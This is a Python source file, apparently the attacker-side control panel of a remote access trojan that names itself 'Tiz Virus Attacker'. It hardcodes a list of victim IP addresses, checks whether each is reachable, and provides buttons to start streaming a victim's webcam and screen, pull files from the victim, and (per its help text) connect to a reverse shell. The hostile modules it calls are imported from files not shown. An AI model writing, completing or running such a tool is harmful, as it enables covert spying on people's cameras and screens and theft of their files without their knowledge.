# -*- coding: utf-8 -*-
"""
Created on Dec 23 2020

@autor Tiz
"""
import pygame
import socket
import argparse
import sys
import threading
# import queue
# from concurrent.futures import ThreadPoolExecutor

from ui.components.colors import *
from ui.components.display import Display
from ui.components.button import Button
from ui.components.input_box import InputBox
from ui.handlers.screen_handler import screenreceiver
from ui.handlers.camera_handler import camerareceiver
from ui.handlers.file_handler import receive_file
# from ui.utils.network import R_tcp

# Initialize Pygame
pygame.init()

# Set up display
WIDTH, HEIGHT = 800, 600
screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("Remote Desktop Menu")

# Font
font = pygame.font.Font(None, 36)

# Vector victim origin
VICTIM_IPS = ['10.10.27.0', '10.10.27.44', '10.10.26.245']

# Thread pool for background tasks


class UIState:
    def __init__(self):
        self.scroll_y = 0
        self.max_scroll_y = 0
        self.full_screen = False
        self.camera_running = False
        self.screen_running = False
        self.file_sending = False
        self.victims_status = {ip: "Not reachable" for ip in VICTIM_IPS}
        self.running = True


ui_state = UIState()


def parseargs():
    cli_args = argparse.ArgumentParser(description="Tiz Virus Attacker")
    cli_args.add_argument('--port',
                          help="default port is 5000, revershell = port, camera stream = port+1, screen stream = port+2",
                          default=5000, type=int)
    options = cli_args.parse_args(sys.argv[1:])
    options.hosts = VICTIM_IPS
    return options


# Create initial displays
displays = [
    Display(50, 50, 200, 150, VICTIM_IPS[0], font),
    Display(300, 50, 200, 150, VICTIM_IPS[1], font),
    Display(550, 50, 200, 150, VICTIM_IPS[2], font),
]

# Create buttons
add_button = Display(WIDTH - 100, HEIGHT - 100, 80, 80, "+", font)
back_button = Display(10, 10, 100, 50, "Back", font)


def create_new_display():
    num_displays = len(displays)
    row = num_displays // 3
    col = num_displays % 3
    x = 50 + col * 250
    y = 50 + row * 200
    return Display(x, y, 200, 150, f"Display {num_displays + 1}", font)


def check_single_victim(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)  # Reduced timeout
        s.connect((host, port))
        s.close()
        return "Reachable"
    except socket.error:
        return "Not reachable"


def status_checker_thread(options):
    while ui_state.running:
        for host in options.hosts:
            status = check_single_victim(host, options.port)
            ui_state.victims_status[host] = status
        pygame.time.delay(2000)  # Check every 2 seconds


def draw_static_frame(surface, frame_rect, border_color=(0, 0, 0), border_width=2):
    """Vẽ khung tĩnh không thay đổi."""
    pygame.draw.rect(surface, border_color, frame_rect, border_width)


def show_full_screen(display, options):
    full_screen = True
    input_box = InputBox(WIDTH // 4 - 100, HEIGHT // 2 + 160, 590, 130, display.text)
    camera_button = Button(WIDTH // 4 - 100, HEIGHT // 2 + 100, 190, 50, "Start Camera", GREEN)
    screen_button = Button(3 * WIDTH // 4 - 100, HEIGHT // 2 + 100, 190, 50, "Start Screen", BLUE)
    file_button = Button(WIDTH // 2 - 100, HEIGHT // 2 + 100, 190, 50, "Receive File", RED)

    screen_receiver = None
    camera_receiver = None
    file_receiver = None

    clock = pygame.time.Clock()

    while full_screen and pygame.display.get_init():
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                if screen_receiver:
                    screen_receiver.stop()
                return
            input_box.handle_event(event, options.port)

            if event.type == pygame.MOUSEBUTTONDOWN:
                if event.button == 1:
                    if back_button.rect.collidepoint(event.pos):
                        if screen_receiver:
                            screen_receiver.stop()
                        full_screen = False
                    elif camera_button.rect.collidepoint(event.pos):
                        if camera_button.text == "Start Camera":
                            ui_state.camera_running = True
                            camera_button.text = "Stop Camera"
                            camera_receiver = camerareceiver(display.text, options.port + 2)
                        else:
                            camera_button.text = "Start Camera"
                            ui_state.camera_running = False
                            if camera_receiver:
                                camera_receiver.stop()
                                camera_receiver = None
                    elif screen_button.rect.collidepoint(event.pos):
                        if screen_button.text == "Start Screen":
                            ui_state.screen_running = True
                            screen_button.text = "Stop Screen"
                            screen_receiver = screenreceiver(display.text, options.port + 1)
                        else:
                            screen_button.text = "Start Screen"
                            ui_state.screen_running = False
                            if screen_receiver:
                                screen_receiver.stop()
                                screen_receiver = None
                    elif file_button.rect.collidepoint(event.pos):
                        if file_button.text == "Receive File":
                            file_button.text = "Received"
                            ui_state.file_sending = True
                            file_receiver = receive_file("0.0.0.0",display.text, options.port + 3)
                        else:
                            file_button.text = "Receive File"
                            ui_state.file_sending = False
                            if file_receiver:
                                file_receiver = None

        try:
            screen.fill(WHITE)
            input_box.draw(screen)
            text_surface = font.render(f"Full Screen: {display.text}", True, BLACK)
            text_rect = text_surface.get_rect(center=(WIDTH // 2, HEIGHT // 4))
            # Define the frame rectangle
            frame_rect = pygame.Rect(WIDTH // 2 - 300, HEIGHT // 2 - 225, 600, 300)

            # Vẽ khung tĩnh chỉ một lần
            draw_static_frame(screen, frame_rect)

            # Cập nhật nội dung bên trong khung
            if screen_receiver and screen_receiver.double_buffer:
                screen.blit(screen_receiver.double_buffer, frame_rect)
                text_surface = font.render("", True, BLACK)
            else:
                screen.blit(text_surface, text_rect)
            
            if camera_receiver and camera_receiver.double_buffer:
                # Tạo Surface từ buffer camera_receiver
                text_surface = font.render("", True, BLACK)
                screen.blit(camera_receiver.double_buffer, frame_rect)
            else:
                screen.blit(text_surface, text_rect)

            
            camera_button.draw(screen)
            screen_button.draw(screen)
            file_button.draw(screen)
            back_button.draw(screen, 0, HEIGHT)

            pygame.display.flip()
            clock.tick(60)  # Limit to 60 FPS

        except pygame.error:
            break

    # Cleanup
    if screen_receiver:
        screen_receiver.stop()


def main():
    global options
    options = parseargs()

    # Start status checker thread
    status_thread = threading.Thread(target=status_checker_thread, args=(options,), daemon=True)
    status_thread.start()
    while ui_state.running:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                ui_state.running = False
                pygame.quit()
                sys.exit()
            if event.type == pygame.MOUSEBUTTONDOWN:
                if event.button == 1:
                    for display in displays:
                        if display.rect.collidepoint(event.pos[0], event.pos[1] + ui_state.scroll_y):
                            show_full_screen(display, options)
                    if add_button.rect.collidepoint(event.pos):
                        new_display = create_new_display()
                        displays.append(new_display)
                        ui_state.max_scroll_y = max(0, (len(displays) // 3) * 200 + 50 - HEIGHT)
                elif event.button == 4:  # Scroll up
                    ui_state.scroll_y = max(0, ui_state.scroll_y - 20)
                elif event.button == 5:  # Scroll down
                    ui_state.scroll_y = min(ui_state.max_scroll_y, ui_state.scroll_y + 20)

        screen.fill(WHITE)

        for display in displays:
            display.draw(screen, ui_state.scroll_y, HEIGHT)

        add_button.draw(screen, 0, HEIGHT)

        # Draw status buttons using cached status
        for i, ip in enumerate(VICTIM_IPS):
            status = ui_state.victims_status.get(ip, "Not reachable")
            if status == "Reachable":
                status_button = Button((i % 3) * 250 + 50, (i // 3) * 250 + 50, 20, 20, "", GREEN)
            else:
                status_button = Button((i % 3) * 250 + 50, (i // 3) * 250 + 50, 20, 20, "", RED)
            status_button.draw(screen, ui_state.scroll_y)

        pygame.display.flip()

    # Cleanup
    pygame.quit()


if __name__ == "__main__":
    main()